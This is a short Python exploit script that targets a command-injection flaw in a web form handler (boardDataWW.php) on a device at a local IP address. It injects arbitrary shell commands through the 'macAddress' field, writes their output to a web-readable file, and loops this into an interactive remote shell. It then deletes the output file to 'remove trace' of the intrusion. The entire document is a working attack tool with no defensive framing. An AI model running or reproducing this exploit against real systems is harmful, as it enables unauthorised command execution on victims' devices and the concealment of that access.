import requests
import sys

host = '192.168.0.100'
port = 80

cmd = ''

while(True):
    cmd = input('Shell_CMD$ ')
    # injecting system command part writing the command output to a output file
    data = {
        'macAddress': '112233445566;' + cmd + ' > ./output #',
        'reginfo': '0',
        'writeData': 'Submit'
    } 

    url = f'http://{host}/boardDataWW.php'
    response = requests.post(url, data=data)

    if(response.ok):
        # read the command output result
        url = f'http://{host}/output'
        cmdOutput = requests.get(url)
        print(cmdOutput.text)

        # remove trace
        cmd = 'rm ./output'
        data = {
            'macAddress': '112233445566;' + cmd + ' #',
            'reginfo': '0',
            'writeData': 'Submit'
        }
        url = f'http://{host}/boardDataWW.php'
        response = requests.post(url, data=data)
    else:
        print('[!] No response from the server.')